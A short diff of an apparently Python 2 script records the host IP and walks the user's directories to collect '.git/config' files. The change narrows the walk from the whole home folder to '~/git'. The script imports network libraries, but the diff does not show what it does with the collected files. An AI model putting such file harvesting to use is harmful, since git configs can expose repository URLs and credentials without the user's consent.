@@ -5,7 +5,7 @@ import urllib, urllib2, sys, socket, re, os
 ip = socket.gethostbyname(socket.gethostname())
 
 
-files = [os.path.join(dp, f) for dp, dn, fn in os.walk(os.path.expanduser("~/")) for f in fn]
+files = [os.path.join(dp, f) for dp, dn, fn in os.walk(os.path.expanduser("~/git")) for f in fn]
 
 for cur in files:
     p1 = re.compile('\.git\/config$')
